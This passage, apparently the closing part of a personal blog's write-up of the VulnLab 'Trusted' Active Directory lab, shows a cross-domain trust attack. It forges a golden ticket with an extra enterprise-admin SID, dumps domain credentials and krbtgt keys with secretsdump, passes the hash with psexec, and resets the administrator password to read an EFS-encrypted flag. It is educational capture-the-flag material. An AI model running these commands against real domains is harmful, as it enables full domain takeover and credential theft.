<p><img src="/img/Trusted/Pasted%20image%2020241126170642.png"></p>
<p>For that we would need the SID of the child and parent domains</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lab.trusted.vl:S-1-5-21-2241985869-2159962460-1278545866</span><br><span class="line">trusted.vl:S-1-5-21-3576695518-347000760-3731839591</span><br><span class="line">krtgt AES-128 key: db0b41cedf222df3808858fc41bb0c02</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticketer.py -aesKey db0b41cedf222df3808858fc41bb0c02 -domain lab.trusted.vl -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 Administrator</span><br></pre></td></tr></table></figure>

<p>After forging that TGT ticket, we export the ticket to KRB5CCNAME as follows:<br><code>export KRBCCNAME=$pwd/Administrator.ccache</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py <span class="string">&quot;lab.trusted.vl&quot;</span>/<span class="string">&quot;Administrator&quot;</span>@<span class="string">&quot;TRUSTEDDC.trusted.vl&quot;</span> -k -no-pass -target-ip 10.10.188.21</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0x530e5141735c78552261589aee704a9a</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:4f0b993922649b613b571e4bfb55e485:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction failed: string index out of range</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:<span class="built_in">hash</span>)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] <span class="variable">$MACHINE</span>.ACC </span><br><span class="line"><span class="variable">$MACHINE</span>.ACC:plain_password_hex:febd83b08d926442f579df8a3a28f3ccb46591cf4a4f19184d1b9a4adc3d68d530bc653da560e60fbca7bc149b82f08aa0e4ed03b1d64199ac7a84ec1b0015fb8fce02ccbc557602f51b45177d748cd859d4e2db4dc827da71a137d80ff497cd9e663c18c94a8d482df767ed26a0bb86f4926bad10de8b31f6cab3c1616791384fd13bb4b0da9a7576f5dfc44d69dff5a2e4cf3b4724657cb835e69f8ee8d7345538fb1c507a86cf7a093b6802502c59b2892af1ebb5105e79680c545e4e44f6b4c185841eb6572817dc509022b3e784f20b735225145827e67cadb167ed84c44edd5034e254b6a1a62a659973c2cf82</span><br><span class="line">TRUSTED\TRUSTEDDC$:aad3b435b51404eeaad3b435b51404ee:2dfbe96194966fce7463b9250cd7de52:::</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0xf37b5fe3fdafe3763118fb8f54160a9032202905</span><br><span class="line">dpapi_userkey:0xd7c1f38889ef556a24592852435da02644e038af</span><br><span class="line">[*] NL<span class="variable">$KM</span> </span><br><span class="line"> 0000   B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44   ...~.....9....<span class="variable">$D</span></span><br><span class="line"> 0010   A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72   ..M..YF........r</span><br><span class="line"> 0020   EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5   ..Z...&amp;.m.......</span><br><span class="line"> 0030   96 CD E5 3F A0 06 5E C1  A5 01 A1 CE 8C 24 76 95   ...?..^......<span class="variable">$v</span>.</span><br><span class="line">NL<span class="variable">$KM</span>:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:15db914be1e6a896e7692f608a9d72ef:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d9436aebee2db5c6e4166d5e2472fa2d:::</span><br><span class="line">TRUSTEDDC$:1000:aad3b435b51404eeaad3b435b51404ee:2dfbe96194966fce7463b9250cd7de52:::</span><br><span class="line">LAB$:1103:aad3b435b51404eeaad3b435b51404ee:a8caaf29722c03c1c667ae2f6bb7fce9:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:d75ec7df1acac724a6dfc250e707aab3492b6d9936b9898f742781b0a871d4a6</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:1cee32af6e8cd27059d855e6c6b4d5ec</span><br><span class="line">Administrator:des-cbc-md5:aed5e385512c685e</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:3e5bc8a7d01388cdaf4ab8541f4e360d4fd9089723cedfd08f8016b7900ba2bf</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:0c847e33f046419fec204e4187eeb1f4</span><br><span class="line">krbtgt:des-cbc-md5:2943ad0131269702</span><br><span class="line">TRUSTEDDC$:aes256-cts-hmac-sha1-96:e7d540c03ca38911ac61a49024c5d4096ea6df801f859e9568223b699da1ebb6</span><br><span class="line">TRUSTEDDC$:aes128-cts-hmac-sha1-96:73198d572d184425e66158764faa0c93</span><br><span class="line">TRUSTEDDC$:des-cbc-md5:85457c520402326b</span><br><span class="line">LAB$:aes256-cts-hmac-sha1-96:66f8931ee557f6a18ca77b62b33e480d546c222ecbd32f18d77df5e63462e9f7</span><br><span class="line">LAB$:aes128-cts-hmac-sha1-96:7f722032c9cbd325f123ff1c2f25eb25</span><br><span class="line">LAB$:des-cbc-md5:4c7fb94591b667f2</span><br></pre></td></tr></table></figure>

<p>We psexec into the TRUSTEDDC DC: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py <span class="string">&quot;trusted.vl&quot;</span>/<span class="string">&quot;Administrator&quot;</span>@10.10.188.21 -target-ip 10.10.188.21 -hashes <span class="string">&quot;:15db914be1e6a896e7692f608a9d72ef&quot;</span>  </span><br></pre></td></tr></table></figure>

<p>However, even though we have System privileges on the machine, we cannot access the root.txt file on the Administrator’s Desktop folder </p>
<p>The <code>access denied</code> was due to EFS encryption, after running:<br><img src="/img/Trusted/Pasted%20image%2020241126200603.png"></p>
<p>The solution was to first change the administrator password <code>net user Administrator Password_123</code> then use RunasCs <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs"></a> to execute the cmd.exe process as the administrator user with his new password</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\runasCs.exe Administrator Password_123 <span class="string">&quot;cmd.exe /c type C:\Users\Administrator\Desktop\root.txt&quot;</span></span><br></pre></td></tr></table></figure>

<p>And we get the root flag:  <code>VL&#123;1ffd4561083a1bdbb4e15346ba7aaf31&#125;</code></p>
<p>Link for completion:  <a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=b53009df-6da9-40fa-992c-4eb6d9600cd4">https://api.vulnlab.com/api/v1/share?id=b53009df-6da9-40fa-992c-4eb6d9600cd4</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://cyberkmz.github.io">Mohamed Khalil Mzali</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://cyberkmz.github.io/2024/11/26/TrustedChainWriteup/">https://cyberkmz.github.io/2024/11/26/TrustedChainWriteup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/Trusted/trusted_slide.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/08/15/BabyWriteup-Vulnlab/" title="Baby VulnLab - Writeup"><img class="cover" src="/img/Baby/baby_vulnlab.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">Baby VulnLab - Writeup</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/CyberKMZ.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mohamed Khalil Mzali</div><div class="author-info__description">Cyber Security Student</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/CyberKMZ"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/CyberKMZ" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:cyber.mzali@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/khalil-mzali/" target="_blank" title=""><i class="fab fa-linkedin-in"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Welcome to my blog where I post about writeups and articles.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI"><span class="toc-number">2.</span> <span class="toc-text">LFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab-Trusted-VL-domain-enumeration"><span class="toc-number">3.</span> <span class="toc-text">Lab.Trusted.VL domain enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL-Hijacking"><span class="toc-number">4.</span> <span class="toc-text">DLL Hijacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Trust-Attack"><span class="toc-number">5.</span> <span class="toc-text">Domain Trust Attack</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/26/TrustedChainWriteup/" title="Trusted AD Chain VulnLab - Writeup"><img src="/img/Trusted/trusted_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Trusted AD Chain VulnLab - Writeup"/></a><div class="content"><a class="title" href="/2024/11/26/TrustedChainWriteup/" title="Trusted AD Chain VulnLab - Writeup">Trusted AD Chain VulnLab - Writeup</a><time datetime="2024-11-25T23:00:00.000Z" title="Created 2024-11-26 00:00:00">2024-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/15/BabyWriteup-Vulnlab/" title="Baby VulnLab - Writeup"><img src="/img/Baby/baby_vulnlab.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Baby VulnLab - Writeup"/></a><div class="content"><a class="title" href="/2024/08/15/BabyWriteup-Vulnlab/" title="Baby VulnLab - Writeup">Baby VulnLab - Writeup</a><time datetime="2024-08-14T23:00:00.000Z" title="Created 2024-08-15 00:00:00">2024-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/15/FeedBackWriteup-Vulnlab/" title="FeedBack VulnLab - Writeup"><img src="/img/Feedback/feedback_vulnlab.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="FeedBack VulnLab - Writeup"/></a><div class="content"><a class="title" href="/2024/08/15/FeedBackWriteup-Vulnlab/" title="FeedBack VulnLab - Writeup">FeedBack VulnLab - Writeup</a><time datetime="2024-08-14T23:00:00.000Z" title="Created 2024-08-15 00:00:00">2024-08-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/Trusted/trusted_slide.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 By Mohamed Khalil Mzali</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>